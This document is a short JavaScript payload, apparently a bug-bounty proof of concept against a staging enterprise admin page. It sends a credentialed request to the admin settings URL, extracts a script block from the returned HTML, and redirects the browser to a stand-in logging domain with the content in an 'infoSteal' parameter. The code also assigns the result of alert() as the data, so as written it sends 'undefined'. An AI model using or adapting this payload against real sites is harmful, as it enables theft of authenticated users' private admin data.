var req1 = new XMLHttpRequest();
req1.onload = req1Listener;
req1.open('get', 'https://hackeronetesting.app.staging.workramp.com/admin/settings/enterprise', true);
req1.withCredentials = true;
req1.send();

function req1Listener() {
    // Create a new DOM parser to parse the response text as HTML
    var parser = new DOMParser();
    var doc = parser.parseFromString(this.responseText, 'text/html');

    // Select the first div with the class 'js-redactor-context'
    var targetDiv = doc.querySelector('.js-redactor-context');

    if (targetDiv) {
        // Get the first <script> tag within that div
        var firstScript = targetDiv.querySelector('script');
        if (firstScript) {
            // Extract the content of the script
            var scriptContent = alert(firstScript.outerHTML); // or use textContent if you want the inner script text only

            // Send the script content to a specified URL
            window.location = '//its-my-example.domain/log?infoSteal=' + encodeURIComponent(scriptContent);
        } else {
            console.log("No script tag found within the target div.");
        }
    } else {
        console.log("No div with class 'js-redactor-context' found.");
    }
}

